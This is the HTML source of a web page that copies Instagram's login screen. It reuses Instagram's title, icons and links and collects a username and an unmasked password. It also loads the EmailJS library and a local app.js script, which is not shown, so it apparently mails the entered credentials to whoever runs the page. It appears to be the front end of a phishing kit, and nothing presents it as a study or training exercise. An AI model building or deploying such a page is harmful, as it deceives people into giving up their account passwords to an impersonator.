<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Login • Instagram</title>
    <link rel="stylesheet" href="/src/output.css" />
    <link
      data-default-icon="https://static.cdninstagram.com/rsrc.php/yv/r/BTPhT6yIYfq.ico"
      rel="shortcut icon"
      type="image/x-icon"
      href="https://static.cdninstagram.com/rsrc.php/yv/r/BTPhT6yIYfq.ico"
    />
    <link
      rel="apple-touch-icon"
      sizes="76x76"
      href="https://static.cdninstagram.com/rsrc.php/v3/yR/r/lam-fZmwmvn.png"
    />
    <link
      rel="apple-touch-icon"
      sizes="120x120"
      href="https://static.cdninstagram.com/rsrc.php/v3/ys/r/aM-g435MtEX.png"
    />
    <link
      rel="apple-touch-icon"
      sizes="152x152"
      href="https://static.cdninstagram.com/rsrc.php/v3/yx/r/H1l_HHqi4p6.png"
    />
    <link
      rel="apple-touch-icon"
      sizes="167x167"
      href="https://static.cdninstagram.com/rsrc.php/v3/yB/r/-7Z_RkdLJUX.png"
    />
    <link
      rel="apple-touch-icon"
      sizes="180x180"
      href="https://static.cdninstagram.com/rsrc.php/v3/yG/r/De-Dwpd5CHc.png"
    />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&family=Roboto:ital,wght@0,100;0,300;0,400;1,100;1,300;1,400&display=swap"
      rel="stylesheet"
    />
  </head>
  <body class="flex flex-col justify-start items-center">
    <div class="">
      <select aria-label="Switch Display Language" class="_aajm w-[5rem] my-2">
        <option value="en">English</option>
        <option value="af">Afrikaans</option>
        <option value="cs">Čeština</option>
        <option value="da">Dansk</option>
        <option value="de">Deutsch</option>
        <option value="el">Ελληνικά</option>
        <option value="en">English</option>
        <option value="en-gb">English (UK)</option>
        <option value="es">Español (España)</option>
        <option value="es-la">Español</option>
        <option value="fi">Suomi</option>
        <option value="fr">Français</option>
        <option value="id">Bahasa Indonesia</option>
        <option value="it">Italiano</option>
        <option value="ja">日本語</option>
        <option value="ko">한국어</option>
        <option value="ms">Bahasa Melayu</option>
        <option value="nb">Norsk</option>
        <option value="nl">Nederlands</option>
        <option value="pl">Polski</option>
        <option value="pt-br">Português (Brasil)</option>
        <option value="pt">Português (Portugal)</option>
        <option value="ru">Русский</option>
        <option value="sv">Svenska</option>
        <option value="th">ภาษาไทย</option>
        <option value="tl">Filipino</option>
        <option value="tr">Türkçe</option>
        <option value="zh-cn">中文(简体)</option>
        <option value="zh-tw">中文(台灣)</option>
        <option value="bn">বাংলা</option>
        <option value="gu">ગુજરાતી</option>
        <option value="hi">हिन्दी</option>
        <option value="hr">Hrvatski</option>
        <option value="hu">Magyar</option>
        <option value="kn">ಕನ್ನಡ</option>
        <option value="ml">മലയാളം</option>
        <option value="mr">मराठी</option>
        <option value="ne">नेपाली</option>
        <option value="pa">ਪੰਜਾਬੀ</option>
        <option value="si">සිංහල</option>
        <option value="sk">Slovenčina</option>
        <option value="ta">தமிழ்</option>
        <option value="te">తెలుగు</option>
        <option value="vi">Tiếng Việt</option>
        <option value="zh-hk">中文(香港)</option>
        <option value="bg">Български</option>
        <option value="fr-ca">Français (Canada)</option>
        <option value="ro">Română</option>
        <option value="sr">Српски</option>
        <option value="uk">Українська</option>
      </select>
    </div>

    <form
      class="border-[1px] border-solid border-gray-300 login__container flex flex-col items-center pt-10 mt-[10px] px-[30px]"
    >
      <img src="/assests/a-logo.png" width="175" height="51" alt="" />
      <button
        class="bg-[#0095F6] text-white py-[7px] px-[50px] mt-[45px] mb-[20px] rounded-[8px] text-[14px]"
      >
        Continue with Facebook
      </button>
      <div class="flex items-center w-full justify-center mb-[20px]">
        <div
          class="border-[0.5px] border-solid border-gray-300 w-[5rem] inline"
        ></div>
        <span class="uppercase text-[13px] mx-[18px]">or</span>
        <div
          class="border-[0.5px] border-solid border-gray-300 w-[5rem] inline"
        ></div>
      </div>
      <!-- inputs -->
      <div class="flex flex-col items-center mb-[15px]">
        <input
          class="outline-none bg-[#FAFAFA] border-[1px] py-[7px] pl-[9px] w-[249.98px] text-[12px] rounded-[5px] border-solid border-gray-300 mb-[0.35rem]"
          type="text"
          placeholder="Phone number, username, or email"
          name="email"
        />
        <input
          class="outline-none bg-[#FAFAFA] border-[1px] py-[7px] pl-[9px] w-[249.98px] text-[12px] rounded-[5px] border-solid border-gray-300"
          type="text"
          placeholder="Password"
          name="password"
        />
      </div>
      <!-- userflow -->
      <div class="w-full flex justify-between items-center">
        <div></div>
        <div class="text-[#0095f6] text-[14px] mb-[15px]"><a href="https://www.instagram.com/accounts/password/reset/?next=%2F">Forgot password?</a></div>
      </div>
      <button
        id="submit"
        class="bg-[#0095F6] text-white py-[7px] px-[110px] mb-[30px] rounded-[8px] text-[14px]"
      >
        Login
      </button>
      <div class="mb-[30px]">
        <p class="text-[#737373] text-[14px] font-semibold">
          Don't have an account? <a class="text-[#0095F6]" href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
        </p>
      </div>
    </form>

    <div
      class="absolute bottom-0 w-full bg-[#FAFAFA] border-[1px] border-solid border-gray-300 flex justify-center items-center py-[0.95rem]"
    >
      <img src="/assests/meta-logo.png" width="52" height="26" alt="" />
    </div>


    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script src="/src/app.js"></script>
  </body>
</html>
